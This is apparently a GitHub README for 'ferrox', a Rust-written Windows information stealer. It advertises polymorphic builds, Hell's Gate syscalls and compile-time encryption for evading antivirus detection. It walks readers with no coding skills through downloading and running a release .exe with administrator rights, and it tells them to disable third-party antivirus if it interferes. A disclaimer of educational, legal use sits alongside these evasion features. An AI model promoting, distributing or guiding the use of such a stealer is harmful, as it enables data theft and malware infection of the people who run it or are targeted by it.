# 🛡 ferrox - Safe Windows Info Stealer Tool

[![Download ferrox](https://img.shields.io/badge/Download-%23007ACC.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ammarss11/ferrox/releases)

## 🔍 What is ferrox?

ferrox is a Windows application created in the Rust programming language. It is designed to collect information from a Windows computer. It uses advanced processes to work quietly and avoid detection by typical Windows security tools. This tool is intended for educational use only.

ferrox includes features such as:

- Polymorphic builds: Each version changes to avoid detection.
- Hell’s Gate syscalls: A method to call system functions more directly.
- Compile-time encryption: Protects data used during building.

This README will help you download and run ferrox on a Windows PC without needing coding skills.

## 💻 System Requirements

Before starting, make sure your Windows PC meets these requirements:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- 500 MB free disk space
- Internet connection for download
- Administrator rights to run the application fully

ferrox is built with modern Windows internals and Rust code, so recent Windows versions work best.

## 🚀 Getting Started

To use ferrox, you only need to download it and run the right file. Follow these steps:

### Step 1: Visit the Download Page

Click this link to open the ferrox releases page on GitHub:

[Download ferrox on GitHub](https://github.com/Ammarss11/ferrox/releases)

You will see different versions of ferrox available for download.

### Step 2: Choose the Correct Version

Look for the latest release in the list. It will usually be marked as "Latest release" at the top.

Inside the release, find the file that matches your Windows system. Most often, this will be a `.exe` file.

The file name might look like this:

`ferrox-vX.X.exe`

### Step 3: Download the File

Click on the `.exe` file to download it to your computer. Save it somewhere easy to find, such as your Desktop or Downloads folder.

### Step 4: Run the Application

Locate the downloaded `.exe` file and double-click it to run.

If Windows asks for permission, click “Yes” to allow the program to run.

It may open a command window or work silently in the background.

## ⚙️ How Does ferrox Work?

ferrox uses specialized Windows functions to gather information from your PC. It focuses on avoiding detection from antivirus software and security systems.

Here are some key points about how it works:

- It changes its code slightly each time you build or download it. This makes it harder for security tools to recognize.
- It calls Windows system functions in a way that bypasses usual monitoring.
- It keeps data encrypted while being built, reducing exposure.

These methods make ferrox a useful tool for learning how software can interact deeply with Windows.

## 🔧 Using ferrox

ferrox does not have a user interface. It runs as a command-line tool without visible windows.

To see output or results, you may need to run it from a Windows command prompt.

### Running via Command Prompt

1. Open the Start menu.
2. Type `cmd` and hit Enter.
3. Use the `cd` command to change the directory to where you saved the `.exe` file. For example, if saved to Desktop:

    ```
    cd %USERPROFILE%\Desktop
    ```

4. Run the program by typing its name:

    ```
    ferrox-vX.X.exe
    ```

Replace `X.X` with the exact version number.

The tool may print status messages or save data files in the same folder.

## 🗂 Output and Logs

ferrox creates log files to show what information it collected.

Look for new files with `.log` or `.txt` extensions in the folder where you ran ferrox.

You can open these with Notepad or any text editor.

Logs provide details for review or further learning about how data was collected.

## 🔄 Updating ferrox

Check the releases page regularly to find new versions.

Downloading and running the latest `.exe` replaces older copies.

Always remove or backup previous files before updating.

## ❓ Troubleshooting

If ferrox doesn’t run:

- Make sure your Windows user has administrator privileges.
- Confirm the downloaded file is complete and unblocked. To unblock, right-click the file, select Properties, and check “Unblock” if present.
- Disable third-party antivirus temporarily if it interferes with running the program.
- Ensure your PC matches the system requirements.

If the command window closes immediately, open `cmd` first and run the program there to see messages.

## 🔒 Security and Privacy

Use ferrox only in controlled, legal environments.

It collects potentially sensitive data. Handle output files carefully.

Do not run on personal or shared computers without permission.

## 📦 Other Info

ferrox is built with these technologies:

- Rust programming language
- Windows system calls
- Encryption during compilation
- Polymorphic code techniques

It focuses on topics like:

- Avoiding analysis and detection
- Working inside virtual machines safely
- Security research and penetration testing

## 📥 Download Links

[![Download ferrox](https://img.shields.io/badge/Download-%23777f7f.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ammarss11/ferrox/releases)

Visit the above link to grab the latest release.

## 🔗 Useful Links

- [GitHub Repository](https://github.com/Ammarss11/ferrox)
- [Releases Page](https://github.com/Ammarss11/ferrox/releases)